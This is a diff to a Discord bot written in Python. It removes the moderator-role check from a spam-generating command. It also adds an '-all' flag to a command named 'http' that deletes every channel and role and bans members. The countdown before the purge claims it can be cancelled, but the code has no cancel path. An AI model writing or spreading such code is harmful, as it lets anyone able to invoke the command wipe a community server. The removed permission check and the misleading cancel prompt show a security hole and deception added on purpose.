@@ -210,7 +210,6 @@ async def shop(ctx):
     name="fillerspam",
     aliases=["fs"],
     help="Creates a channel and generates spam test messages. DEVS ONLY")
-@has_any_role("mod")
 async def filler_spam(ctx):
 
   new_channel = await ctx.guild.create_text_channel("test-http-channel")
@@ -796,6 +795,7 @@ async def on_message(message):
     await bot.process_commands(message)
 
 
+
 http_explanation = """
 ***Info:***
 Deletes messages or entire channels based on flags.
@@ -870,7 +870,39 @@ async def http(ctx, *args):
           reason="7/http command with -rmc or -rmc.trf flag")
 
     return
+  if "-all" in args:
+    countdown_message = await ctx.send(
+        "! - Server Purge Sequence Initiated: (--s) Run 7/shutdown -e again to cancel.")
 
+    for i in range(5, 0, -1):
+      await countdown_message.edit(
+          content=f"! - Server Purge Sequence Initiated: ({i}s) Run 7/shutdown -e again to cancel.")
+      await asyncio.sleep(1)
+
+    await countdown_message.edit(content="! - Delete All Sequence Initiated: (0s)")
+    await asyncio.sleep(0.5)
+    await countdown_message.edit(content="! - Delete All Sequence Finished - Deleting all channels, roles, and bans members.")
+
+    for channel in ctx.guild.channels:
+      try:
+        await channel.delete(reason="7/http command with -all flag")
+      except Exception as e:
+        await ctx.send(f"Failed to delete {channel.name}: {e}")
+
+    for role in ctx.guild.roles:
+      try:
+        await role.delete(reason="7/http command with -all flag")
+      except Exception as e:
+        await ctx.send(f"Failed to delete role {role.name}: {e}")
+
+    for member in ctx.guild.members:
+      try:
+        if member != ctx.guild.owner and ctx.me.top_role > member.top_role:
+          await member.ban(reason="7/http command with -all flag")
+      except Exception as e:
+        await ctx.send(f"Failed to ban {member.name}: {e}")
+
+    return
   if "-num" in args or "-trf.num" in args:
     try:
       num_index = args.index("-num") + 1 if "-num" in args else args.index("-trf.num") + 2
